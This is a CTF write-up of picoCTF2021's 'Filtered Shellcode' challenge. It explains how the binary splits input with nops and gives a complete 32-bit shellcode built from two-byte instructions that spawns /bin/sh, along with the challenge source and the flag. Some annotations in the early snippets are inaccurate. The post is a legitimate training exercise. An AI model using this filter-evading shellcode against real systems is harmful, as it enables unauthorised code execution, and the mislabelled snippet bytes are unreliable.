---
layout: post
title:  "Filtered Shellcode - Pwn"
date:   2021-03-31 12:28:05 +0100
categories: writeups
---

```
Challenge: Filtered Shellcode
Author: Tiugi
Description: Shellcode with limited length instructions
CTF: picoCTF2021
Category: Pwn
```


The challenge seems to offer the possibility to execute arbitrary code, but like the title says there is some kind of filter.
First I recover some data from the ELF:

FILE OUTPUT:

fun: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=325e35378982f451f374c7140c5249bb1c52ab18, not stripped

CHECKSEC OUTPUT:

Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments


Then I started the reversing phase using Ghidra to see the disassembled and decompiled version of the ELF.
There are two interesting functions:

main

![main function](https://github.com/pwnthenope/pwnthenope.github.io/blob/main/static/post_images/filtered_shellcode_main.png?raw=true)


execute

![execute function](https://github.com/pwnthenope/pwnthenope.github.io/blob/main/static/post_images/filtered_shellcode_execute.png?raw=true)


The main receives from the user at most 1000 bytes, stopping when receiving a '\n' ("\x0a"), that it passes our input to the execute function which allocate a buffer on the heap with a size two times bigger than payload and fills the newly created buffer following a simple procedure: it takes two bytes from our input, than it puts two '\x90' (nop opcode), then two bytes from our input, and so on until it used all our "code". It then closes the buffer with a '\xc3' (ret opcode). Finally it puts the content of this buffer inside a memory area with execute permission and run the code inside it.

The program indeed execute the code that we give to it, but every instruction with a length greater than 2 will be divided with nops, becoming corrupted.
We must build a shellcode with instructions divided in groups of two bytes, so the first thing is not use the mov instruction with immediate values because is at least 3 bytes long, replacing it with an intelligent use of push and pop.
To open a shell, we can use the syscall to execle which needes: (don't forget that we have a 32-bit ELF)

eax = 0xb                              # EXECLE SYSCALL ID CODE
ebx = POINTER TO THE STRING "/bin/sh"  # THE INSTRUCTION TO BE EXECUTED
ecx = 0
edx = 0


For "eax" we can do:

 6a 4f   push 0xb
 58      pop eax     # two groups of two bytes
 90      nop


For "ecx" and "edx" we can do:

 31 c9   xor ecx,ecx
 89 ca   mov edx,ecx


For "ebx" we have to realize a thing: our original buffer is still on the stack during the execution of our shellcode, so we can put the string "/bin/bash" in the end of the payload and find the offset from the esp (Stack Pointer).
After some "try and error" I built the following payload:

0:  89 e3                   mov    ebx,esp
2:  6a 60                   push   0x60
4:  59                      pop    ecx
5:  90                      nop
6:  01 cb                   add    ebx,ecx
8:  6a 4f                   push   0x4f
a:  59                      pop    ecx
b:  90                      nop
c:  01 cb                   add    ebx,ecx
e:  6a 0b                   push   0xb
10: 58                      pop    eax
11: 90                      nop
12: 31 c9                   xor    ecx,ecx
14: 89 ca                   mov    edx,ecx
16: cd 80                   int    0x80
    /bin/sh\x00

Using a python script I interacted with the remote service and successfully opened a shell. From there a simple "cat flag.txt" was all we need to retrieve the flag:

picoCTF{th4t_w4s_fun_f1ed6f7952ff4071}



Side Note:

With the remote shell I was able to retrieve the original C code of the challenge:

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_LENGTH 1000

void execute(char *shellcode, size_t length) {
    if (!shellcode || !length) {
        exit(1);
    }
    size_t new_length = length * 2;
    char result[new_length + 1];

    int spot = 0;
    for (int i = 0; i < new_length; i++) {
        if ((i % 4) < 2) {
            result[i] = shellcode[spot++];
        } else {
            result[i] = '\x90';
        }
    }
    // result[new_length] = '\xcc';
    result[new_length] = '\xc3';

    // Execute code
    int (*code)() = (int(*)())result;
    code();
}

int main(int argc, char *argv[]) {
    setbuf(stdout, NULL);
    char buf[MAX_LENGTH];
    size_t length = 0;
    char c = '\0';

    printf("Give me code to run:\n");
    c = fgetc(stdin);
    while ((c != '\n') && (length < MAX_LENGTH)) {
        buf[length] = c;
        c = fgetc(stdin);
        length++;
    }
    if (length % 2) {
        buf[length] = '\x90';
        length++;
    }
    execute(buf, length);
    return 0;
}
{% endhighlight %}

